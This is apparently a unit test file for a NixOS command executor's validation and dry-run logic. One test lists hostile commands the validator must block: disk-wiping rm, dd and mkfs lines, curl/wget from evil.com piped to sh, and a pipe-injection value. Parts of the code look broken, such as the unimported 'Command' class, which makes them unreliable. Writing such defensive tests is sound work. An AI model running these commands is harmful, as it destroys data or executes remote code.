#!/usr/bin/env python3
import pytest
import os

# Skip if not on NixOS
if not os.path.exists("/nix/store"):
    pytest.skip("NixOS required for this test", allow_module_level=True)

"""
Enhanced unit tests for the SafeExecutor component
Tests safe command building, validation, execution modes, and security
"""

import subprocess

# Add the src directory to Python path
import sys
import unittest

from unittest.mock import Mock, MagicMock, patch, call
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from luminous_nix.core import SafeExecutor
from luminous_nix.api.schema import Context

class TestSafeExecutorEnhanced(unittest.TestCase):
    """Enhanced tests for the SafeExecutor component"""

    def setUp(self):
        """Create SafeExecutor instance for testing"""
        self.engine = SafeExecutor(dry_run=True)

    def test_initialization(self):
        """Test default initialization"""
        self.assertTrue(self.engine.dry_run)
        self.assertTrue(self.engine.sandbox_enabled)
        self.assertEqual(self.engine.timeout, 300)

        # Test with custom settings
        engine_custom = SafeExecutor(dry_run=False)
        self.assertFalse(engine_custom.dry_run)

    def test_build_command_install(self):
        """Test building install command"""
        cmd = self.engine.build_command("install", "firefox")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nix")
        self.assertEqual(cmd.args, ["profile", "install", "nixpkgs#firefox"])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)
        self.assertEqual(cmd.description, "Install firefox")

    def test_build_command_remove(self):
        """Test building remove command"""
        cmd = self.engine.build_command("remove", "firefox")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nix")
        self.assertEqual(cmd.args, ["profile", "remove", "firefox"])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)

    def test_build_command_update(self):
        """Test building update command"""
        cmd = self.engine.build_command("update")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nixos-rebuild")
        self.assertEqual(cmd.args, ["switch"])
        self.assertTrue(cmd.safe)
        self.assertTrue(cmd.requires_sudo)

    def test_build_command_search(self):
        """Test building search command"""
        cmd = self.engine.build_command("search", "python")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nix")
        self.assertEqual(cmd.args, ["search", "nixpkgs", "python", "--json"])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)

    def test_build_command_rollback(self):
        """Test building rollback command"""
        cmd = self.engine.build_command("rollback")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nixos-rebuild")
        self.assertEqual(cmd.args, ["switch", "--rollback"])
        self.assertTrue(cmd.safe)
        self.assertTrue(cmd.requires_sudo)

    def test_build_command_list(self):
        """Test building list command"""
        cmd = self.engine.build_command("list")

        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, "nix")
        self.assertEqual(cmd.args, ["profile", "list"])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)

    def test_build_command_unknown(self):
        """Test building unknown command returns None"""
        cmd = self.engine.build_command("unknown_action")
        self.assertIsNone(cmd)

    def test_validate_command_safe(self):
        """Test validation of safe commands"""
        cmd = Command(
            program="nix",
            args=["search", "firefox"],
            safe=True,
            requires_sudo=False,
            description="Test command",
        )

        with patch.object(self.engine, "_command_exists", return_value=True):
            valid, error = self.engine.validate_command(cmd)
            self.assertTrue(valid)
            self.assertIsNone(error)

    def test_validate_command_unsafe(self):
        """Test validation rejects unsafe commands"""
        cmd = Command(
            program="rm",
            args=["-rf", "/"],
            safe=False,
            requires_sudo=True,
            description="Dangerous command",
        )

        valid, error = self.engine.validate_command(cmd)
        self.assertFalse(valid)
        self.assertEqual(error, "Command is not marked as safe")

    def test_validate_command_dangerous_patterns(self):
        """Test validation detects dangerous patterns"""
        dangerous_commands = [
            Command("rm", ["-rf", "/home"], True, False, ""),
            Command("dd", ["if=/dev/zero", "of=/dev/sda"], True, False, ""),
            Command("mkfs.ext4", ["/dev/sda"], True, False, ""),
            Command("echo", ["test", ">", "/dev/null"], True, False, ""),
            Command("curl", ["http://evil.com", "|", "sh"], True, False, ""),
            Command("wget", ["http://evil.com", "|", "sh"], True, False, ""),
        ]

        with patch.object(self.engine, "_command_exists", return_value=True):
            for cmd in dangerous_commands:
                valid, error = self.engine.validate_command(cmd)
                self.assertFalse(valid)
                self.assertIn("Dangerous pattern detected", error)

    def test_validate_command_pipe_injection(self):
        """Test validation prevents pipe injection"""
        cmd = Command(
            program="nix",
            args=["search", "firefox|malicious"],
            safe=True,
            requires_sudo=False,
            description="Test",
        )

        with patch.object(self.engine, "_command_exists", return_value=True):
            valid, error = self.engine.validate_command(cmd)
            self.assertFalse(valid)
            self.assertIn("pipe character", error)

    def test_validate_command_not_found(self):
        """Test validation when command doesn't exist"""
        cmd = Command(
            program="nonexistent",
            args=["--help"],
            safe=True,
            requires_sudo=False,
            description="Test",
        )

        with patch.object(self.engine, "_command_exists", return_value=False):
            valid, error = self.engine.validate_command(cmd)
            self.assertFalse(valid)
            self.assertEqual(error, "Command not found: nonexistent")

    def test_execute_explain_mode(self):
        """Test execution in explain mode"""
        cmd = Command(
            "nix", ["profile", "install", "firefox"], True, False, "Install firefox"
        )

        result = self.engine.execute(cmd.EXPLAIN)

        self.assertTrue(result["success"])
        self.assertIn("explanation", result)
        self.assertIn("command", result)
        self.assertFalse(result["would_execute"])
        self.assertEqual(
            result["explanation"],
            "This will install the package into your user profile",
        )

    def test_command_exists(self):
        """Test command existence check"""
        with patch("subprocess.run") as mock_run:
            # Command exists
            mock_run.return_value = MagicMock(returncode=0)
            self.assertTrue(self.engine._command_exists("ls"))

            # Command doesn't exist
            mock_run.return_value = MagicMock(returncode=1)
            self.assertFalse(self.engine._command_exists("nonexistent"))

    def test_get_safe_env(self):
        """Test safe environment generation"""
        # Mock some environment variables
        with patch.dict(
            os.environ,
            {
                "HOME": "/home/test",
                "USER": "testuser",
                "NIX_PATH": "nixpkgs=/nix/store/xyz",
                "NIX_PROFILES": "/nix/var/nix/profiles",
                "DANGEROUS_VAR": "should_not_be_included",
            },
        ):
            env = self.engine._get_safe_env()

            # Check required vars are present
            self.assertIn("PATH", env)
            self.assertEqual(env["HOME"], "/home/test")
            self.assertEqual(env["USER"], "testuser")
            self.assertEqual(env["LANG"], "en_US.UTF-8")

            # Check NIX vars are included
            self.assertEqual(env["NIX_PATH"], "nixpkgs=/nix/store/xyz")
            self.assertEqual(env["NIX_PROFILES"], "/nix/var/nix/profiles")

            # Check dangerous var is excluded
            self.assertNotIn("DANGEROUS_VAR", env)

    def test_explain_command_coverage(self):
        """Test command explanation for all command types"""
        test_cases = [
            (
                Command("nix", ["profile", "install", "pkg"], True, False, ""),
                "This will install the package into your user profile",
            ),
            (
                Command("nix", ["profile", "remove", "pkg"], True, False, ""),
                "This will remove the package from your user profile",
            ),
            (
                Command("nixos-rebuild", ["switch"], True, True, ""),
                "This will rebuild and switch to the new system configuration",
            ),
            (
                Command("nixos-rebuild", ["switch", "--rollback"], True, True, ""),
                "This will switch back to the previous system generation",
            ),
            (
                Command("nix", ["search", "pkg"], True, False, ""),
                "This will search for packages matching your query",
            ),
            (
                Command("nix", ["profile", "list"], True, False, ""),
                "This will show all packages in your profile",
            ),
            (
                Command("unknown", ["command"], True, False, "Custom description"),
                "Custom description",
            ),
        ]

        for cmd, expected in test_cases:
            explanation = self.engine._explain_command(cmd)
            self.assertEqual(explanation, expected)

    def test_dry_run_flag_addition(self):
        """Test that dry-run flag is added correctly for nix commands"""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

            # Test with nix command
            cmd = Command("nix", ["build", "test"], True, False, "")
            self.engine.execute(cmd.DRY_RUN)

            call_args = mock_run.call_args[0][0]
            self.assertIn("--dry-run", call_args)

            # Test with nixos-rebuild command
            cmd = Command("nixos-rebuild", ["switch"], True, True, "")
            self.engine.execute(cmd.DRY_RUN)

            call_args = mock_run.call_args[0][0]
            self.assertIn("--dry-run", call_args)

    def test_validation_with_empty_args(self):
        """Test validation handles commands with empty args"""
        cmd = Command("nix", [], True, False, "")

        with patch.object(self.engine, "_command_exists", return_value=True):
            valid, error = self.engine.validate_command(cmd)
            self.assertTrue(valid)  # Empty args should be valid

    def test_execute_with_custom_timeout(self):
        """Test execution respects custom timeout"""
        self.engine.timeout = 60  # Set custom timeout

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 60)

            cmd = Command("nix", ["build"], True, False, "")
            result = self.engine.execute(cmd.EXECUTE)

            self.assertFalse(result["success"])
            self.assertEqual(result["error"], "Command timed out after 60 seconds")

    def test_safe_environment_minimal(self):
        """Test safe environment with minimal system env"""
        with patch.dict(os.environ, {}, clear=True):
            env = self.engine._get_safe_env()

            # Should still have basic required vars
            self.assertIn("PATH", env)
            self.assertIn("HOME", env)
            self.assertIn("USER", env)
            self.assertIn("LANG", env)

            # Should use defaults when not available
            self.assertEqual(env["HOME"], "/tmp")
            self.assertEqual(env["USER"], "nobody")

    def test_command_building_edge_cases(self):
        """Test command building with None or empty targets"""
        # Remove with None target should still work
        cmd = self.engine.build_command("remove", None)
        self.assertIsNotNone(cmd)
        self.assertIn(None, cmd.args)  # None gets included in args

        # Search with empty string
        cmd = self.engine.build_command("search", "")
        self.assertIsNotNone(cmd)
        self.assertIn("", cmd.args)

    def test_concurrent_safety(self):
        """Test that engine can handle concurrent executions safely"""
        import threading

        results = []

        def execute_command():
            cmd = Command("echo", ["test"], True, False, "")
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(
                    returncode=0, stdout="test", stderr=""
                )
                result = self.engine.execute(cmd.EXECUTE)
                results.append(result)

        threads = []
        for _ in range(5):
            thread = threading.Thread(target=execute_command)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # All executions should succeed
        self.assertEqual(len(results), 5)
        for result in results:
            self.assertTrue(result["success"])

if __name__ == "__main__":
    unittest.main()
